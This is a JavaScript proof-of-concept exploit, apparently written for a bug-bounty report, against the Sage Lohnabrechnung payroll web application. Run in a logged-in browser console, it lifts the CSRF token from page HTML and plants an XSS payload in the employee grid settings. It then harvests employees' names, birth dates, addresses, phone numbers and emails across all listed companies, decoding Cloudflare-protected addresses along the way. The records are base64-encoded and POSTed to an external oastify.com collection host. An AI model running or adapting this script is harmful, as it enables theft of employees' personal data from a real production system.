/**
 * Sage Lohnabrechnung — XSS impact PoC (authorized testing only)
 *
 * Run in DevTools Console while logged in on lohnabrechnung.sage.com (any page).
 *
 * Flow:
 *   1. Fetch /companies → parse _csrfToken from HTML (HttpOnly cookie not readable in JS)
 *   2. POST + PUT /settings/preferences/store → show EMail column
 *   3. Fetch /companies → enumerate company IDs
 *   4. Fetch each /companies/{id}/employees → parse grid + decode CF emails
 *   5. Optional: exfil base64 JSON to OAST (for report proof)
 */
(async function lohnabrechnungEmployeeExtractPoC() {
  'use strict';

  const BASE = location.origin; // https://lohnabrechnung.sage.com
  const OAST_HOST = '78dsx5tizgmyajfy8gpjw37cs3yumka9.oastify.com'; // set '' to skip exfil
  const GRID_COLUMNS = [
    'EmployeeNumber',
    'FirstName<img>', // XSS demo column — use 'FirstName' if you only want email display
    'LastName',
    'BirthDate',
    'Entry',
    'Exit',
    'JobType',
    'ExitReason',
    'SocialInsuranceNumber',
    'Action',
    'Sex',
    'Street',
    'ZipCode',
    'City',
    'Phone',
    'Mobile',
    'EMail',
  ];

  // ---------- Cloudflare email-protection decode ----------
  // HTML from fetch() contains data-cfemail="hex..." not the visible address
  function decodeCfEmail(hex) {
    if (!hex || hex.length < 4) return '';
    const key = parseInt(hex.slice(0, 2), 16);
    let out = '';
    for (let i = 2; i < hex.length; i += 2) {
      out += String.fromCharCode(parseInt(hex.slice(i, i + 2), 16) ^ key);
    }
    return out;
  }

  function extractEmailFromCell(cell) {
    if (!cell) return '';

    // 1) data-cfemail on __cf_email__ anchor (works on fetched HTML)
    const cf = cell.querySelector('a.__cf_email__[data-cfemail], [data-cfemail]');
    if (cf) {
      const decoded = decodeCfEmail(cf.getAttribute('data-cfemail'));
      if (decoded.includes('@')) return decoded;
    }

    // 2) href="/cdn-cgi/l/email-protection#hex"
    const a = cell.querySelector('a[href*="email-protection"]');
    if (a) {
      const href = a.getAttribute('href') || '';
      const hash = href.split('#')[1];
      if (hash) {
        const decoded = decodeCfEmail(hash);
        if (decoded.includes('@')) return decoded;
      }
      const decoded = decodeCfEmail(a.getAttribute('data-cfemail'));
      if (decoded.includes('@')) return decoded;
    }

    // 3) plain text (live DOM after CF script runs)
    const text = (cell.textContent || '').replace(/\u00a0/g, ' ').trim();
    if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(text.replace(/\s/g, ''))) {
      return text.replace(/\s/g, '');
    }

    // 4) regex fallback on innerHTML
    const html = cell.innerHTML || '';
    const m = html.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/);
    return m ? m[0] : '';
  }

  function cleanText(text) {
    if (!text) return '';
    const ta = document.createElement('textarea');
    ta.innerHTML = text;
    return ta.value.replace(/\u00a0/g, ' ').replace(/\s+/g, ' ').trim();
  }

  // ---------- CSRF from fetched HTML (HttpOnly SEC[csrfToken] cookie is not readable) ----------
  function parseCsrfFromHtml(html) {
    if (!html) return null;

    const doc = new DOMParser().parseFromString(html, 'text/html');
    const input =
      doc.querySelector('input[name="_csrfToken"]') ||
      doc.querySelector('input[name="csrfToken"]');
    if (input?.value) return input.value;

    const patterns = [
      /name="_csrfToken"\s+value="([^"]+)"/i,
      /name='_csrfToken'\s+value='([^']+)'/i,
      /name="csrfToken"\s+value="([^"]+)"/i,
      /"csrfToken"\s*:\s*"([^"]+)"/i,
      /csrf-token"\s+content="([^"]+)"/i,
    ];
    for (const re of patterns) {
      const m = html.match(re);
      if (m?.[1]) return m[1];
    }
    return null;
  }

  /** Prefer live DOM, then fetch https://lohnabrechnung.sage.com/companies */
  async function getCsrfToken() {
    const live =
      document.querySelector('#new_SopEmployee input[name="_csrfToken"]') ||
      document.querySelector('form input[name="_csrfToken"]') ||
      document.querySelector('input[name="_csrfToken"]');
    if (live?.value) {
      console.log('🔑 CSRF source: current page DOM');
      return live.value;
    }

    const fromCurrentPage = parseCsrfFromHtml(document.documentElement.innerHTML);
    if (fromCurrentPage) {
      console.log('🔑 CSRF source: current page HTML');
      return fromCurrentPage;
    }

    console.log('🔑 CSRF source: fetching /companies ...');
    const resp = await fetch(`${BASE}/companies`, {
      credentials: 'include',
      headers: { Accept: 'text/html,application/xhtml+xml', 'X-Requested-With': 'XMLHttpRequest' },
    });
    if (!resp.ok) {
      throw new Error(`Cannot fetch /companies for CSRF: HTTP ${resp.status}`);
    }
    const html = await resp.text();
    const token = parseCsrfFromHtml(html);
    if (!token) {
      throw new Error('CSRF not found in /companies HTML — session expired?');
    }
    return token;
  }

  async function fetchCompaniesPage() {
    const resp = await fetch(`${BASE}/companies`, {
      credentials: 'include',
      headers: { Accept: 'text/html,application/xhtml+xml', 'X-Requested-With': 'XMLHttpRequest' },
    });
    if (!resp.ok) throw new Error(`/companies HTTP ${resp.status}`);
    return resp.text();
  }

  // ---------- Update grid preferences (POST + PUT) ----------
  async function storeGridPreferences(csrfToken) {
    const url = `${BASE}/settings/preferences/store`;
    const body = new URLSearchParams();
    body.set('key', 'grid.config.SopEmployee');
    GRID_COLUMNS.forEach((c) => body.append('value[]', c));
    body.set('_csrfToken', csrfToken);

    const headers = {
      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
      'X-Requested-With': 'XMLHttpRequest',
      'X-Csrf-Token': csrfToken,
      Accept: 'text/plain, */*; q=0.01',
    };

    const results = {};
    for (const method of ['POST', 'PUT']) {
      const resp = await fetch(url, {
        method,
        credentials: 'include',
        headers,
        body: body.toString(),
      });
      results[method] = {
        status: resp.status,
        body: await resp.text(),
      };
      console.log(`[${method}] preferences/store →`, results[method].status, results[method].body.slice(0, 120));
    }
    return results;
  }

  function buildColumnMap(doc) {
    const headers = doc.querySelectorAll('#SopEmployee_grid thead th, #SopEmployee_grid thead td');
    const map = {};
    headers.forEach((th, i) => {
      const label = cleanText(th.textContent).toLowerCase();
      map[label] = i;
    });

    // fuzzy aliases (DE/EN)
    const resolve = (...names) => {
      for (const n of names) {
        const k = Object.keys(map).find((h) => h.includes(n.toLowerCase()));
        if (k !== undefined) return map[k];
      }
      return -1;
    };

    return {
      employeeNumber: resolve('mitarbeiter', 'employee', 'nummer', 'number'),
      firstName: resolve('vorname', 'first'),
      lastName: resolve('nachname', 'last'),
      birthDate: resolve('geburt', 'birth'),
      street: resolve('straße', 'strasse', 'street'),
      zipCode: resolve('plz', 'zip', 'postleitzahl'),
      city: resolve('ort', 'city', 'stadt'),
      phone: resolve('telefon', 'phone') ,
      mobile: resolve('mobil', 'mobile', 'handy'),
      email: resolve('email', 'e-mail', 'mail'),
    };
  }

  function extractEmployeesFromHTML(html, companyId) {
    const doc = new DOMParser().parseFromString(html, 'text/html');
    const rows = doc.querySelectorAll('#SopEmployee_grid tbody tr');
    const col = buildColumnMap(doc);

    console.log(`  column map company ${companyId}:`, col);

    const employees = [];
    rows.forEach((row) => {
      const cells = row.querySelectorAll('td');
      if (cells.length < 5) return;

      const get = (idx) => (idx >= 0 && cells[idx] ? cleanText(cells[idx].textContent) : '');
      const emailCell = col.email >= 0 ? cells[col.email] : null;

      const emp = {
        companyId,
        employeeNumber: get(col.employeeNumber),
        firstName: get(col.firstName),
        lastName: get(col.lastName),
        birthDate: get(col.birthDate),
        street: get(col.street),
        zipCode: get(col.zipCode),
        city: get(col.city),
        phone: get(col.phone),
        mobile: get(col.mobile),
        email: extractEmailFromCell(emailCell),
        fullAddress: [get(col.street), get(col.zipCode), get(col.city)].filter(Boolean).join(', '),
      };
      emp.fullName = `${emp.firstName} ${emp.lastName}`.trim();

      if (emp.employeeNumber || emp.fullName) employees.push(emp);
    });

    return employees;
  }

  function extractCompanyIds(html) {
    const ids = new Set();
    const re = /\/companies\/(?:overview\/)?(\d+)/g;
    let m;
    while ((m = re.exec(html)) !== null) ids.add(m[1]);
    return [...ids];
  }

  function base64Encode(str) {
    return btoa(unescape(encodeURIComponent(str)));
  }

  async function exfil(data) {
    if (!OAST_HOST) {
      console.log('📋 exfil skipped — data:', data);
      return;
    }
    const payload = base64Encode(JSON.stringify(data));
    await fetch(`https://${OAST_HOST}/collect`, {
      method: 'POST',
      mode: 'no-cors',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: `data=${encodeURIComponent(payload)}`,
    });
    console.log(`📤 sent ${data.length} records (base64 len ${payload.length})`);
  }

  // ---------- main ----------
  try {
    console.log('🚀 start — base:', BASE);

    const companiesHtml = await fetchCompaniesPage();
    const csrf = parseCsrfFromHtml(companiesHtml) || (await getCsrfToken());
    console.log('🔑 CSRF:', csrf.slice(0, 8) + '...');

    await storeGridPreferences(csrf);

    // small delay so server persists prefs
    await new Promise((r) => setTimeout(r, 500));

    const companyIds = extractCompanyIds(companiesHtml);
    console.log('🏢 companies:', companyIds);

    let all = [];
    for (const id of companyIds) {
      console.log(`📋 fetch employees company ${id}...`);
      const r = await fetch(`${BASE}/companies/${id}/employees`, { credentials: 'include' });
      if (!r.ok) {
        console.warn(`  skip ${id}: HTTP ${r.status}`);
        continue;
      }
      const html = await r.text();
      const emps = extractEmployeesFromHTML(html, id);
      console.log(`  ✅ ${emps.length} employees`);
      emps.slice(0, 2).forEach((e, i) =>
        console.log(`    ${i + 1}. ${e.fullName} | ${e.email || '(no email)'}`)
      );
      all = all.concat(emps);
    }

    console.log(`📊 total: ${all.length}`);
    console.table(all.map((e) => ({
      company: e.companyId,
      nr: e.employeeNumber,
      name: e.fullName,
      email: e.email,
    })));

    const b64 = base64Encode(JSON.stringify(all));
    console.log('📋 base64 (for report):', b64.slice(0, 80) + '...');
    console.log('decode: JSON.parse(decodeURIComponent(escape(atob("<paste>"))))');

    await exfil(all);
    return all;
  } catch (e) {
    console.error('❌', e);
    throw e;
  }
})();
